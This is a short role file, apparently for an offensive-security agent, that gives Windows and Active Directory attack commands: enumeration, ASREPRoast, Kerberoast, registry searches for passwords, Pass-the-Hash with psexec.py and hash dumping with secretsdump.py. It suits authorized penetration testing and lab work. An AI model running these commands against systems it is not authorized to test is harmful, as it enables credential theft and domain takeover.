# Role: Windows / AD Specialist

**Department:** offensive-security

## หน้าที่
Windows & Active Directory exploitation — from SMB/LDAP enumeration to Domain Admin

## Pre-Shell Enumeration
```bash
enum4linux -a <IP>
nmap --script smb-vuln* -p 445 <IP>
GetNPUsers.py <domain>/ -dc-ip <IP> -no-pass -usersfile users.txt  # ASREPRoast
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request          # Kerberoast
```

## Post-Shell PrivEsc
```powershell
whoami /priv           # SeImpersonatePrivilege → JuicyPotato/PrintSpoofer
cmdkey /list           # stored credentials
reg query HKLM /f password /t REG_SZ /s
```

## Credential Attacks
```bash
psexec.py <domain>/<user>@<IP> -hashes :<NTLM>   # Pass-the-Hash
secretsdump.py <domain>/<user>:<pass>@<IP>         # dump hashes
```

## Output → session.md
- AD attack path, credentials found, privilege level
